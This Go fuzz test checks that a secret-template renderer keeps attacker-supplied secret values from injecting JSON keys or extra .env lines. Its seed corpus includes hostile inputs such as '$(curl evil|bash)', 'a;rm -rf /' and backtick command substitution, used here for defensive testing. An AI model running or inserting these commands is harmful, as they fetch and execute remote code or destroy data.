package secrettemplate

// render_structure_fuzz_test.go — ML1 injection-class fuzzing of the
// secret-template RENDER path (task ML1, piece 2: templates / structural
// equality).
//
// The existing FuzzParse (render_fuzz_test.go) pressure-tests the PARSER's
// structural invariants over arbitrary template text. This target is
// complementary: it fuzzes the attacker-controlled SECRET VALUE that a Resolver
// substitutes into the output — the value is set by whoever can write that one
// secret, who may be far less trusted than the template's author (render.go's
// own motivating threat model). It drives the two structured render paths:
//   - RenderJSON  (EscapeJSONString): placeholder inside a JSON string field.
//   - Render      (raw, .env/KV):     placeholder on a single KV line.
//
// Oracle (STRUCTURAL EQUALITY vs a benign value of the same shape, via an
// INDEPENDENT parser):
//   - JSON arm: parse the rendered document with encoding/json and assert the
//     key SET is exactly {"pw","keep"} (the template's own two keys) and the
//     constant field is untouched — a secret value that broke out of its quoted
//     field to inject/overwrite a key would change the key set or fail parsing.
//   - Raw arm: the rendered output has exactly the same number of physical lines
//     as the benign render — a value that smuggled a newline (or was rejected by
//     the guard) cannot add a KV line.
// In both arms a value that the render-time guards (newline/CR/NUL, shell
// metacharacters) reject is a SAFE outcome (err returned, nothing rendered), not
// a finding.
//
// What this oracle does NOT verify (report):
//   - It does not test the YAML escape path (yamlescape.RenderYAML): yaml.v3 is
//     deliberately kept out of this package's closure, so the YAML arm would
//     have to live in the yamlescape package — noted as a follow-up, not covered
//     here.
//   - It does not prove EscapeJSONString is a COMPLETE JSON escaper for every
//     Unicode edge (it delegates to encoding/json, which this oracle trusts); it
//     proves only that the rendered document parses to the intended structure.
//   - It fuzzes a single-placeholder template shape; multi-placeholder
//     interaction (two attacker values adjacent) is not separately explored.
//   - It does not assert the raw .env output is shell-SAFE beyond the guard's own
//     denylist — the guard is defense-in-depth, and this oracle only confirms no
//     extra LINE appears, not that a single-line value is inert in every shell.

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/keyorixhq/keyorix/internal/fuzzutil"
)

func FuzzSecretTemplateRenderStructure(f *testing.F) {
	for _, v := range []string{
		"hunter2",
		`","evil":"injected`,        // JSON key-injection attempt
		`\",\"evil\":\"x`,           // escaped-quote confusion
		"line1\nline2",              // newline (raw guard should reject)
		"val`whoami`",               // shell metachar (guard should reject)
		"$(curl evil|bash)",         // command substitution
		"a;rm -rf /",                // command separator
		"plain-safe-value",          //
		`{"nested":"json"}`,         // value that looks like JSON
		"\x00nul",                   // NUL (guard should reject)
		strings.Repeat("A", 100000), // large value (output cap)
		"quote\"inside",             // bare quote (JSON escape must neutralise)
		"back\\slash",               // backslash
	} {
		f.Add(v)
	}

	f.Fuzz(func(t *testing.T, value string) {
		resolve := func(ref string) (string, error) { return value, nil }

		// --- JSON arm: structural equality of the parsed document. ---
		const jsonTmpl = `{"pw":"${secret:x}","keep":"const"}`
		var jsonOut string
		var jErr error
		fuzzutil.Guard(t.Fatalf, "secrettemplate.RenderJSON", func() {
			jsonOut, jErr = RenderJSON(jsonTmpl, resolve)
		})
		if jErr == nil {
			var m map[string]any
			if err := json.Unmarshal([]byte(jsonOut), &m); err != nil {
				t.Fatalf("RenderJSON output is not valid JSON (value broke out of its field): %v\nvalue=%q\nout=%q", err, value, jsonOut)
			}
			if len(m) != 2 {
				t.Fatalf("JSON injection: rendered document has %d keys, want 2 (keys=%v)\nvalue=%q\nout=%q", len(m), keysOf(m), value, jsonOut)
			}
			if _, ok := m["pw"]; !ok {
				t.Fatalf("expected key \"pw\" missing — structure altered\nvalue=%q out=%q", value, jsonOut)
			}
			if m["keep"] != "const" {
				t.Fatalf("constant field overwritten/altered: keep=%v\nvalue=%q out=%q", m["keep"], value, jsonOut)
			}
			// Fidelity: the decoded secret value equals the stdlib JSON round-trip
			// of the input. For valid UTF-8 that is the input verbatim; for
			// invalid UTF-8 encoding/json coerces to U+FFFD (an EXPECTED-DIFFERENCE,
			// lossy but NOT a structure break — see report). Comparing to the
			// reference round-trip keeps this byte-exact where it can be and proves
			// EscapeJSONString adds no corruption beyond stdlib's own coercion.
			if pw, ok := m["pw"].(string); ok && pw != jsonRefValue(value) {
				t.Fatalf("JSON escaping altered the value beyond stdlib coercion: got %q want %q", pw, jsonRefValue(value))
			}
		}

		// --- Raw/.env arm: line-count equality vs benign. ---
		const rawTmpl = "PASSWORD=${secret:x}\nOTHER=constant"
		var rawOut string
		var rErr error
		fuzzutil.Guard(t.Fatalf, "secrettemplate.Render", func() {
			rawOut, rErr = Render(rawTmpl, resolve)
		})
		if rErr == nil {
			benignOut, err := Render(rawTmpl, func(string) (string, error) { return "benign", nil })
			if err != nil {
				t.Fatalf("benign baseline render failed: %v", err)
			}
			if gotLines, wantLines := countLines(rawOut), countLines(benignOut); gotLines != wantLines {
				t.Fatalf("raw-template line injection: output has %d lines, benign has %d\nvalue=%q\nout=%q", gotLines, wantLines, value, rawOut)
			}
		}
	})
}

// jsonRefValue is the reference encoding/json round-trip of a standalone string
// (U+FFFD-coerced for invalid UTF-8), the fidelity baseline for EscapeJSONString.
func jsonRefValue(s string) string {
	b, err := json.Marshal(s)
	if err != nil {
		return s
	}
	var out string
	if err := json.Unmarshal(b, &out); err != nil {
		return s
	}
	return out
}

func keysOf(m map[string]any) []string {
	ks := make([]string, 0, len(m))
	for k := range m {
		ks = append(ks, k)
	}
	return ks
}

func countLines(s string) int { return strings.Count(s, "\n") + 1 }
